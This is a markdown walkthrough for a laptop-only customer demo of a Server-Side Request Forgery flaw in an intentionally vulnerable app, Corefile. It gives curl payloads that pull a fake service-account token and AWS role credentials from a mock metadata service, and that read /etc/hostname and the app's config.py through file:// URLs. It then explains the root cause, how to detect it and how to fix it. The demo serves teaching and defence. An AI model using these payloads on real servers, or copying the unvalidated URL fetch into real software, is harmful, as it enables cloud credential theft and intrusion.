# SSRF live demo — Corefile "Attach remote corefile"

A five-minute, laptop-only walkthrough of a **Server-Side Request Forgery**
vulnerability and its exploit, for a customer meeting. Everything here is
loopback-only and every secret the exploit "steals" is a fake. Nothing touches
a real cloud account.

> **SSRF in one line:** the server fetches a URL you control, so *your* request
> reaches things *the server* can reach but *you* can't — internal services and,
> most damagingly, the cloud instance-metadata endpoint that hands out the
> workload's credentials.

---

## The feature (why this endpoint exists)

Corefile is crash-dump forensics "from cloud resource back to the offending
line." A natural feature: **Attach a remote corefile** — an analyst pastes a URL
to a symbol server or a teammate's shared dump, and Corefile fetches it
server-side. That feature is `GET /api/fetch?url=…` in `app.py`. It fetches the
analyst-supplied URL and returns the body. No allowlist, any scheme, follows
redirects → a textbook **full-read SSRF**.

- **Sink:** `app.py` → `fetch_remote_corefile()` → `urllib.request.urlopen(url)`
- **Class:** CWE-918 (SSRF). Full-read: the response body comes back to the caller.
- **Auth:** none — reachable by an anonymous scanner / DAST, which makes it a
  strong contrast with the authenticated IDOR findings.

---

## Setup — two terminals

**Terminal A — the mock metadata service** (stands in for `169.254.169.254`,
which you can't reach from a laptop):

```bash
python3 demo/ssrf/metadata_mock.py
# [metadata-mock] listening on http://127.0.0.1:8081 ...
```

Leave it running and visible — it logs each SSRF request as it arrives, so the
room *watches* the server-side fetch happen.

**Terminal B — Corefile** (the vulnerable app):

```bash
python app.py          # serves on http://127.0.0.1:8000
# if 8000 is busy on your machine:  PORT=8090 python -c "import os,app; \
#   app.init_db(); app.app.run(host='127.0.0.1', port=int(os.environ['PORT']))"
```

**Terminal C — you, the attacker** (curl). Optional: `| jq .body -r` to pretty-print.

---

## The exploit

### Beat 1 — a benign-looking fetch

Show the feature working the way it's "meant" to — point it at the mock's root:

```bash
curl -s 'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/'
```

Corefile dutifully fetches a URL *for* you. Note who made that request:
Terminal A logs it as coming from `127.0.0.1` — **the server**, not you.

### Beat 2 — the pivot: steal the cloud service-account token

Now aim the same feature at the metadata service. On a real cloud host this URL
is `http://169.254.169.254/…` or `http://metadata.google.internal/…`; the mock
serves the identical path on loopback:

```bash
curl -s 'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/computeMetadata/v1/instance/service-accounts/default/token' | jq -r .body
```

Result — the workload's OAuth access token walks straight back to the attacker:

```json
{
  "access_token": "ya29.DEMO-FAKE-DO-NOT-USE-a1B2c3D4e5F6g7H8i9J0kLmNoPqRsTuVwXyZ",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

**This is the "aha".** That token is the identity of the pod/VM. With it, the
attacker is now the workload — they can call the cloud APIs the service account
is authorized for (read buckets, registries, secrets…) from their own laptop.
Confirm whose identity it is:

```bash
curl -s 'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/computeMetadata/v1/instance/service-accounts/default/email' | jq -r .body
# corefile-forensics@corefile-demo.iam.gserviceaccount.com
```

### Beat 3 (optional) — same bug, other clouds / other reach

Same endpoint, different targets — drives home that SSRF is *reach*, not one URL:

```bash
# AWS IMDSv1 role credentials (no header required on IMDSv1):
curl -s 'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/latest/meta-data/iam/security-credentials/corefile-forensics-role' | jq -r .body

# file:// scheme — read a local file off the server (urllib honours it):
curl -s 'http://127.0.0.1:8000/api/fetch?url=file:///etc/hostname' | jq -r .body

# ...including the app's own hardcoded secrets, without ever seeing the source:
curl -s "http://127.0.0.1:8000/api/fetch?url=file://$(pwd)/config.py" | jq -r .body | head
```

---

## Why it works (the root cause, in one breath)

`url` is attacker-controlled and passed straight to `urllib.request.urlopen`.
Nothing validates the **scheme** (so `file://` and others are live), the
**host** (so link-local `169.254.169.254` and `localhost`-only services are in
reach), or the **resolved IP** (so a public hostname that resolves to a private
address — or a redirect to one — still lands). And the **response body is
returned to the caller**, which turns "can reach" into "can read": full-read SSRF.

## The GCP header nuance (be honest in the room)

Real GCP metadata requires a `Metadata-Flavor: Google` request header, which a
*pure URL-only* SSRF can't set — so against real GCP this exact endpoint would
get a 403 on the `/computeMetadata` tree. Two true things to say:

- **AWS IMDSv1** and most **internal services** need no such header — the URL-only
  SSRF above hits them as shown. (AWS IMDSv2 and the GCP header exist precisely
  *because* of SSRF.)
- Many real SSRFs *do* let the attacker influence headers, or the app forwards
  its own — at which point the GCP gate falls too.

The mock defaults to **not** enforcing the header so the laptop demo just works.
To tell the nuanced story instead, set `STRICT_HEADER = True` in
`metadata_mock.py` and show the 403, then explain the AWS/internal path still
works.

---

## How Corefile's pipeline should catch this

Tie it back to the product story:

- **SAST / source review** flags `urlopen` on request-derived input with no
  allowlist (CWE-918) — before it ships.
- **DAST** hits `/api/fetch` unauthenticated and probes it with a callback URL /
  metadata target — catches it at runtime, no source needed.
- **Cloud posture** is the backstop: had the vuln shipped, least-privilege on the
  workload's service account and enforcing **IMDSv2 / metadata concealment**
  shrink the blast radius of a stolen token.

**Fix at the sink:** allowlist scheme (`http`/`https` only) and host, resolve the
host and reject private / link-local / loopback ranges *before* connecting,
disable redirects (or re-validate each hop), and never return the raw body.

---

## Safety

- Loopback only; never expose Corefile (`app.py` is intentionally vulnerable).
- The mock and every token/credential it returns are **fake** — invented values
  in real formats. None grants any access.
- Stop both servers with Ctrl-C when done.
